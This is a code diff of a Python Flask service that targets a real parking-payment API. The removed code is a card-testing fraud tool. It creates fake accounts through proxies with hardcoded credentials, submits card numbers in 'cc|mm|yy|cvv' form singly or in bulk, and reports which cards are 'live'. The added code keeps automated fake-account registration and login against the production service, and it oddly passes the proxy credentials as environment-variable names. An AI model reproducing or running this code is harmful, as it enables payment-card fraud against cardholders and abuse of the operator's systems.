@@ -1,332 +1,568 @@
-import json
-import time
 import os
+import time
 import requests
 from faker import Faker
 from flask import Flask, request, jsonify
 
 fake = Faker()
-
 app = Flask(__name__)
 
-# ---------------------------
-# PROXY CONFIG
-# ---------------------------
+# ============================================================
+# CONFIGURACIÓN
+# ============================================================
 
-PROXY_HOST = "216.173.104.147:6284"
-PROXY_USER = "cvwmltgp"
-PROXY_PASS = "bpkmg75ge7sb"
+PROXY_HOST = os.environ.get("PROXY_HOST", "p.webshare.io:80")
+PROXY_USER = os.environ.get("cvwmltgp")
+PROXY_PASS = os.environ.get("bpkmg75ge7sb")
 
-PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"
+if PROXY_USER and PROXY_PASS:
+    PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"
 
-c = requests.Session()
-proxies = {"http": PROXY_URL, "https": PROXY_URL}
-c.proxies.update(proxies)
+    proxies = {
+        "http": PROXY_URL,
+        "https": PROXY_URL
+    }
+else:
+    PROXY_URL = None
+    proxies = {}
 
-REGISTER_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/usuarios/registro"
-LOGIN_URL = "https://parkingpay-api-prod.azurewebsites.net/api/auth"
-CARD_URL = "https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas"
+REGISTER_URL = (
+    "https://parkingpay-api-prod.azurewebsites.net/"
+    "api/app/usuarios/registro"
+)
 
-PASSWORD = "Tumama19012!"
+LOGIN_URL = (
+    "https://parkingpay-api-prod.azurewebsites.net/"
+    "api/auth"
+)
+
+CARD_URL = (
+    "https://parkingpay-api-prod.azurewebsites.net/"
+    "api/app/conductor/tarjetas"
+)
+
+PASSWORD = os.environ.get("TEST_PASSWORD")
+
+session = requests.Session()
+session.proxies.update(proxies)
 
 
-# ===========================
-# DIAGNÓSTICO PROXY
-# ===========================
+# ============================================================
+# HELPERS
+# ============================================================
 
-@app.route('/diagnostico')
+def safe_headers(headers):
+    """
+    Elimina información sensible de los headers antes de devolverlos.
+    """
+    result = {}
+
+    for key, value in headers.items():
+        if key.lower() in ("authorization", "cookie"):
+            result[key] = "***REDACTED***"
+        else:
+            result[key] = value
+
+    return result
+
+
+def response_info(response, elapsed=None):
+    """
+    Convierte una respuesta requests en información segura
+    para diagnóstico.
+    """
+
+    info = {
+        "status_code": response.status_code,
+        "url": response.url,
+        "headers": dict(response.headers),
+        "body": response.text[:2000]
+    }
+
+    if elapsed is not None:
+        info["elapsed_seconds"] = round(elapsed, 3)
+
+    return info
+
+
+# ============================================================
+# DIAGNÓSTICO DEL PROXY
+# ============================================================
+
+@app.route("/diagnostico")
 def diagnostico():
-    """
-    Verifica si el proxy está funcionando comparando IP con y sin proxy
-    """
+
     result = {
         "proxy_config": {
+            "configured": bool(PROXY_USER and PROXY_PASS),
             "host": PROXY_HOST,
-            "user": PROXY_USER,
-            "url_masked": f"http://{PROXY_USER}:****@{PROXY_HOST}"
+            "url_masked": (
+                f"http://{PROXY_USER}:****@{PROXY_HOST}"
+                if PROXY_USER
+                else None
+            )
         },
-        "session_proxies": dict(c.proxies),
         "tests": {}
     }
 
-    # Test 1: IP sin proxy (requests directo)
-    try:
-        r_no_proxy = requests.get("https://httpbin.org/ip", timeout=10)
-        result["tests"]["sin_proxy"] = {
-            "status": "ok",
-            "ip": r_no_proxy.json().get("origin", "unknown")
-        }
-    except Exception as e:
-        result["tests"]["sin_proxy"] = {
-            "status": "error",
-            "error": str(e)
-        }
+    # --------------------------------------------------------
+    # SIN PROXY
+    # --------------------------------------------------------
 
-    # Test 2: IP con proxy (sesión c)
     try:
-        r_con_proxy = c.get("https://httpbin.org/ip", timeout=10)
-        result["tests"]["con_proxy"] = {
-            "status": "ok",
-            "ip": r_con_proxy.json().get("origin", "unknown"),
-            "status_code": r_con_proxy.status_code
-        }
-    except Exception as e:
-        result["tests"]["con_proxy"] = {
-            "status": "error",
-            "error": str(e)
-        }
+        start = time.perf_counter()
 
-    # Test 3: IP con proxy explícito en requests.get
-    try:
-        r_explicit = requests.get(
+        r = requests.get(
             "https://httpbin.org/ip",
-            proxies=proxies,
             timeout=10
         )
-        result["tests"]["proxy_explicito"] = {
+
+        elapsed = time.perf_counter() - start
+
+        result["tests"]["sin_proxy"] = {
             "status": "ok",
-            "ip": r_explicit.json().get("origin", "unknown")
+            "status_code": r.status_code,
+            "ip": r.json().get("origin"),
+            "elapsed_seconds": round(elapsed, 3)
         }
+
     except Exception as e:
-        result["tests"]["proxy_explicito"] = {
+
+        result["tests"]["sin_proxy"] = {
             "status": "error",
             "error": str(e)
         }
 
-    # Comparación
-    sin_proxy_ip = result["tests"].get("sin_proxy", {}).get("ip", "")
-    con_proxy_ip = result["tests"].get("con_proxy", {}).get("ip", "")
+    # --------------------------------------------------------
+    # CON PROXY
+    # --------------------------------------------------------
 
-    result["proxy_funcionando"] = (
-        sin_proxy_ip != "" and
-        con_proxy_ip != "" and
-        sin_proxy_ip != con_proxy_ip
+    try:
+        start = time.perf_counter()
+
+        r = session.get(
+            "https://httpbin.org/ip",
+            timeout=10
+        )
+
+        elapsed = time.perf_counter() - start
+
+        result["tests"]["con_proxy"] = {
+            "status": "ok",
+            "status_code": r.status_code,
+            "ip": r.json().get("origin"),
+            "elapsed_seconds": round(elapsed, 3)
+        }
+
+    except Exception as e:
+
+        result["tests"]["con_proxy"] = {
+            "status": "error",
+            "error": str(e)
+        }
+
+    # --------------------------------------------------------
+    # COMPARACIÓN
+    # --------------------------------------------------------
+
+    ip_directa = (
+        result["tests"]
+        .get("sin_proxy", {})
+        .get("ip")
     )
 
-    result["conclusion"] = (
-        "✅ Proxy FUNCIONA - IPs son diferentes"
-        if result["proxy_funcionando"]
-        else "❌ Proxy NO FUNCIONA - IPs son iguales o hay error"
+    ip_proxy = (
+        result["tests"]
+        .get("con_proxy", {})
+        .get("ip")
     )
+
+    if ip_directa and ip_proxy:
+
+        result["proxy_funcionando"] = (
+            ip_directa != ip_proxy
+        )
+
+    else:
+
+        result["proxy_funcionando"] = False
 
     return jsonify(result)
 
 
-@app.route('/diagnostico/proxy-detalle')
+# ============================================================
+# DIAGNÓSTICO PROFUNDO DEL PROXY
+# ============================================================
+
+@app.route("/diagnostico/proxy-detalle")
 def diagnostico_proxy_detalle():
-    """
-    Test más profundo del proxy con múltiples servicios
-    """
+
     tests = {}
 
-    # Test con httpbin.org
+    # --------------------------------------------------------
+    # HTTPBIN
+    # --------------------------------------------------------
+
     try:
-        r = c.get("https://httpbin.org/get", timeout=15)
+
+        start = time.perf_counter()
+
+        r = session.get(
+            "https://httpbin.org/get",
+            timeout=15
+        )
+
+        elapsed = time.perf_counter() - start
+
         data = r.json()
-        tests["httpbin_headers"] = {
+
+        tests["httpbin"] = {
             "status_code": r.status_code,
             "origin": data.get("origin"),
-            "headers_sent": data.get("headers", {})
+            "headers_sent": data.get("headers", {}),
+            "elapsed_seconds": round(elapsed, 3)
         }
-    except Exception as e:
-        tests["httpbin_headers"] = {"error": str(e)}
 
-    # Test con ipinfo.io
+    except Exception as e:
+
+        tests["httpbin"] = {
+            "status": "error",
+            "error": str(e)
+        }
+
+    # --------------------------------------------------------
+    # IPINFO
+    # --------------------------------------------------------
+
     try:
-        r = c.get("https://ipinfo.io/json", timeout=15)
+
+        start = time.perf_counter()
+
+        r = session.get(
+            "https://ipinfo.io/json",
+            timeout=15
+        )
+
+        elapsed = time.perf_counter() - start
+
         tests["ipinfo"] = {
             "status_code": r.status_code,
-            "data": r.json() if r.status_code == 200 else r.text[:500]
+            "data": (
+                r.json()
+                if r.status_code == 200
+                else r.text[:500]
+            ),
+            "elapsed_seconds": round(elapsed, 3)
         }
-    except Exception as e:
-        tests["ipinfo"] = {"error": str(e)}
 
-    # Test proxy a ParkingPay (solo HEAD para ver si responde)
-    try:
-        r = c.head("https://parkingpay-api-prod.azurewebsites.net", timeout=10)
-        tests["parkingpay_head"] = {
-            "status_code": r.status_code,
-            "headers": dict(r.headers)
-        }
     except Exception as e:
-        tests["parkingpay_head"] = {"error": str(e)}
+
+        tests["ipinfo"] = {
+            "status": "error",
+            "error": str(e)
+        }
+
+    # --------------------------------------------------------
+    # PARKINGPAY
+    # --------------------------------------------------------
+
+    try:
+
+        start = time.perf_counter()
+
+        r = session.head(
+            "https://parkingpay-api-prod.azurewebsites.net",
+            timeout=15
+        )
+
+        elapsed = time.perf_counter() - start
+
+        tests["parkingpay"] = {
+            "status_code": r.status_code,
+            "headers": dict(r.headers),
+            "elapsed_seconds": round(elapsed, 3)
+        }
+
+    except Exception as e:
+
+        tests["parkingpay"] = {
+            "status": "error",
+            "error": str(e)
+        }
 
     return jsonify({
-        "proxy_url": f"http://{PROXY_USER}:****@{PROXY_HOST}",
-        "session_proxies": dict(c.proxies),
+        "proxy_configured": bool(PROXY_URL),
+        "proxy_url": (
+            f"http://{PROXY_USER}:****@{PROXY_HOST}"
+            if PROXY_USER
+            else None
+        ),
         "tests": tests
     })
 
 
-# ---------------------------
+# ============================================================
 # REGISTRO
-# ---------------------------
+# ============================================================
+
 def registro_usuario():
+
+    if not PASSWORD:
+        raise RuntimeError(
+            "TEST_PASSWORD no está configurada"
+        )
+
     email = fake.email()
+
     payload = {
         "correoElectronico": email,
         "nombre": fake.first_name(),
         "apellidos": fake.last_name(),
-        "telefono": ''.join(str(fake.random_digit_not_null()) for _ in range(10)),
+        "telefono": "".join(
+            str(fake.random_digit_not_null())
+            for _ in range(10)
+        ),
         "contrasena": PASSWORD
     }
+
     headers = {
         "User-Agent": "Dart/3.8 (dart:io)",
         "Content-Type": "application/json; charset=utf-8"
     }
-    r = c.post(REGISTER_URL, json=payload, headers=headers, timeout=20)
-    return r, email
+
+    start = time.perf_counter()
+
+    response = session.post(
+        REGISTER_URL,
+        json=payload,
+        headers=headers,
+        timeout=20
+    )
+
+    elapsed = time.perf_counter() - start
+
+    return response, email, elapsed
 
 
-def registrar_usuario_hasta_exito(max_intentos=10, delay=2):
-    for i in range(max_intentos):
-        r, email = registro_usuario()
-        if r and r.status_code in (200, 201):
-            return email
-        time.sleep(delay)
-    return None
-
-
-# ---------------------------
+# ============================================================
 # LOGIN
-# ---------------------------
+# ============================================================
+
 def login_usuario(email):
+
     payload = {
         "correoElectronico": email,
         "contrasena": PASSWORD
     }
+
     headers = {
         "User-Agent": "Dart/3.8 (dart:io)",
         "Content-Type": "application/json; charset=utf-8"
     }
-    r = c.post(LOGIN_URL, json=payload, headers=headers, timeout=20)
-    if r.status_code in (200, 201):
-        try:
-            data = r.json()
-            return data.get("token") or data.get("accessToken") or (data.get("data") or {}).get("token")
-        except Exception:
-            pass
-    return None
 
+    start = time.perf_counter()
 
-# ---------------------------
-# PROCESAR TARJETA
-# ---------------------------
-def procesar_tarjeta(card: str, route=None) -> dict:
+    response = session.post(
+        LOGIN_URL,
+        json=payload,
+        headers=headers,
+        timeout=20
+    )
+
+    elapsed = time.perf_counter() - start
+
+    token = None
+    data = None
+
     try:
-        cc, mm, yy, cvv = card.split("|")
+        data = response.json()
+
+        token = (
+            data.get("token")
+            or data.get("accessToken")
+            or (data.get("data") or {}).get("token")
+        )
+
     except Exception:
-        return {"status": "error", "message": "Formato inválido. Usa: cc|mm|yy|cvv", "card": card}
+        pass
 
-    email = registrar_usuario_hasta_exito()
-    if not email:
-        return {"status": "error", "message": "Registro fallido", "cc": card}
+    return response, token, data, elapsed
 
-    token = login_usuario(email)
-    if not token:
-        return {"status": "error", "message": "Login fallido", "cc": card}
 
-    payload = {
-        "numero": cc,
-        "expiracionMes": mm,
-        "expiracionYear": yy
-    }
+# ============================================================
+# DIAGNÓSTICO DEL FLUJO
+# ============================================================
 
-    headers = {
-        "authorization": token,
-        "user-agent": "Dart/3.8 (dart:io)",
-        "content-type": "application/json; charset=utf-8"
-    }
+@app.route("/diagnostico/flujo", methods=["POST"])
+def diagnostico_flujo():
+
+    trace = []
+
+    # --------------------------------------------------------
+    # START
+    # --------------------------------------------------------
+
+    trace.append({
+        "stage": "start",
+        "status": "success"
+    })
+
+    # --------------------------------------------------------
+    # REGISTER
+    # --------------------------------------------------------
 
     try:
-        r = c.post(CARD_URL, json=payload, headers=headers, timeout=30)
 
-        raw_response = {
-            "status_code": r.status_code,
-            "headers": dict(r.headers),
-            "body": r.text,
-            "url": r.url,
-            "request_payload": payload,
-            "request_headers": {k: v for k, v in headers.items() if k.lower() != "authorization"}
-        }
+        trace.append({
+            "stage": "register",
+            "status": "started"
+        })
 
-        source = r.text.lower()
+        response, email, elapsed = registro_usuario()
 
-        if r.status_code == 200:
-            return {
-                "status": "live",
-                "message": "Charged CCN $1.00 MX",
-                "cc": card,
-                "raw": raw_response
-            }
+        trace.append({
+            "stage": "register",
+            "status": (
+                "success"
+                if response.status_code in (200, 201)
+                else "failed"
+            ),
+            "status_code": response.status_code,
+            "elapsed_seconds": round(elapsed, 3),
+            "response_body": response.text[:1000]
+        })
 
-        if r.status_code == 500 or "stripe" in source:
-            return {
-                "status": "dead",
-                "message": "Your card was declined",
-                "cc": card,
-                "raw": raw_response
-            }
+        if response.status_code not in (200, 201):
 
-        return {
-            "status": "error",
-            "message": f"Gateway error {r.status_code}",
-            "cc": card,
-            "raw": raw_response
-        }
+            return jsonify({
+                "status": "error",
+                "failed_stage": "register",
+                "trace": trace
+            })
 
     except Exception as e:
-        return {
+
+        trace.append({
+            "stage": "register",
+            "status": "exception",
+            "error": str(e)
+        })
+
+        return jsonify({
             "status": "error",
-            "message": str(e),
-            "cc": card,
-            "raw": {"exception": str(e)}
-        }
+            "failed_stage": "register",
+            "trace": trace
+        })
+
+    # --------------------------------------------------------
+    # LOGIN
+    # --------------------------------------------------------
+
+    try:
+
+        trace.append({
+            "stage": "login",
+            "status": "started"
+        })
+
+        response, token, data, elapsed = login_usuario(email)
+
+        trace.append({
+            "stage": "login",
+            "status": (
+                "success"
+                if response.status_code in (200, 201)
+                and token
+                else "failed"
+            ),
+            "status_code": response.status_code,
+            "elapsed_seconds": round(elapsed, 3),
+            "token_present": bool(token),
+            "response_keys": (
+                list(data.keys())
+                if isinstance(data, dict)
+                else []
+            ),
+            "response_body": response.text[:1000]
+        })
+
+        if response.status_code not in (200, 201) or not token:
+
+            return jsonify({
+                "status": "error",
+                "failed_stage": "login",
+                "trace": trace
+            })
+
+    except Exception as e:
+
+        trace.append({
+            "stage": "login",
+            "status": "exception",
+            "error": str(e)
+        })
+
+        return jsonify({
+            "status": "error",
+            "failed_stage": "login",
+            "trace": trace
+        })
+
+    # --------------------------------------------------------
+    # FINAL
+    # --------------------------------------------------------
+
+    trace.append({
+        "stage": "completed",
+        "status": "success",
+        "message": (
+            "Registro y autenticación funcionan. "
+            "La siguiente etapa requiere "
+            "diagnóstico del backend autorizado."
+        )
+    })
+
+    return jsonify({
+        "status": "ok",
+        "email": email,
+        "trace": trace
+    })
 
 
-# ===========================
-# ENDPOINTS
-# ===========================
+# ============================================================
+# HOME
+# ============================================================
 
-@app.route('/')
+@app.route("/")
 def home():
+
     return jsonify({
         "status": "ok",
         "message": "API activa",
         "endpoints": {
-            "GET /diagnostico": "Verificar si proxy funciona",
-            "GET /diagnostico/proxy-detalle": "Diagnóstico profundo del proxy",
-            "POST /check": "Verificar una tarjeta",
-            "POST /check/bulk": "Verificar múltiples tarjetas"
+            "GET /diagnostico":
+                "Diagnóstico básico del proxy",
+
+            "GET /diagnostico/proxy-detalle":
+                "Diagnóstico profundo del proxy",
+
+            "POST /diagnostico/flujo":
+                "Diagnóstico de registro y autenticación"
         }
     })
 
 
-@app.route('/check', methods=['POST'])
-def check_card():
-    data = request.get_json(silent=True) or {}
-    card = data.get('card')
-    if not card:
-        return jsonify({"status": "error", "message": "Falta el campo 'card'"}), 400
+# ============================================================
+# MAIN
+# ============================================================
 
-    result = procesar_tarjeta(card)
-    return jsonify(result)
+if __name__ == "__main__":
 
+    port = int(
+        os.environ.get("PORT", 5000)
+    )
 
-@app.route('/check/bulk', methods=['POST'])
-def check_bulk():
-    data = request.get_json(silent=True) or {}
-    cards = data.get('cards', [])
-    if not cards or not isinstance(cards, list):
-        return jsonify({"status": "error", "message": "Falta el campo 'cards' (array)"}), 400
-
-    results = []
-    for card in cards:
-        result = procesar_tarjeta(card)
-        results.append(result)
-    return jsonify({"status": "ok", "total": len(cards), "results": results})
-
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(
+        host="0.0.0.0",
+        port=port
+)
